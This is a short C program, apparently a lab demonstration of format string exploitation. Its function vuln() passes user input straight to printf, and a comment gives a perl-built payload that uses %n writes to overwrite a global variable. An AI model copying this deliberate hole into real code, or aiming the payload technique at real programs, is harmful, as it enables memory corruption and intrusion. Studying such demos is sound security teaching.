/*
Demonstrate howto exploit format string bugs
./fmt `perl -e'print "AAAA\x28\xa0\x04\x08AAAA\x29\xa0\x04\x08AAAA\x2a\xa0\x04\x08.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x|%90u%n%516u%n%u%n|"'`
*/


#include <stdio.h>
#include <string.h>

char FindMe[] = "Hello";
long ChangeMe = 0x12345678;


void
vuln (char * arg)
{
        char buf[1024];
	printf ("&buf = %p\n", &buf);

        snprintf (buf, sizeof (buf), "%s", arg);
        printf (arg);
        printf ("\n");
}

int
main (int argc, char ** argv)
{
        printf ("FindMe = %p\n", FindMe);
        printf ("ChangeMe (%p) = 0x%08x\n", &ChangeMe, ChangeMe);

        if (argv[1])
                vuln (argv[1]);

        printf ("ChangeMe (%p) = 0x%08x\n", &ChangeMe, ChangeMe);

        return (0);
}
